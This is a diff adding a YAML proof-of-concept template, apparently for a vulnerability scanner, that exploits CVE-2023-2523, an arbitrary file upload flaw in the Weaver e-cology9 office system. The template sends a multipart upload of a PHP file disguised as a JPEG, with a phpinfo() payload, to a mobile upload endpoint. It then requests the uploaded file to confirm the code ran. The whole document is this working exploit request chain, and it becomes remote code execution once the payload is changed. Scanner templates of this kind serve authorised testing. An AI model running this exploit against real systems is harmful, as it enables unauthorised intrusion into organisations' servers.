@@ -1,0 +1,43 @@
+id: poc-yaml-weaver-e-cology9-collaborative-office-system-file-upload
+info:
+  name: 泛微e-cology9协同办公系统 任意文件上传漏洞(CVE-2023-2523)
+  severity: critical
+  tags:
+  - CVE-2023-2523
+  - 两高一弱
+  finger: e-cology
+variables:
+  t1: random_str(8)
+requests:
+- method: POST
+  path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+  data: '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+    Content-Disposition: form-data; name="upload_quwan"; filename="{{.t1}}.php."
+
+    Content-Type: image/jpeg
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+    Content-Disposition: form-data; name="file"; filename=""
+
+    Content-Type: application/octet-stream
+
+
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6ttdRVCGWq4Cx3Sq6tt--
+
+    '
+  expression: status_code == 200 && contains(body,t1) && contains(body,"/webroot")
+  output:
+  - regex_match(body,"(?P<random>[0-9]{10})")
+- method: GET
+  path: /attachment/{{.random}}/{{.t1}}.php
+  expression: status_code == 200 && contains(body,"System") && contains(body,"PHP
+    API")
+transport: http
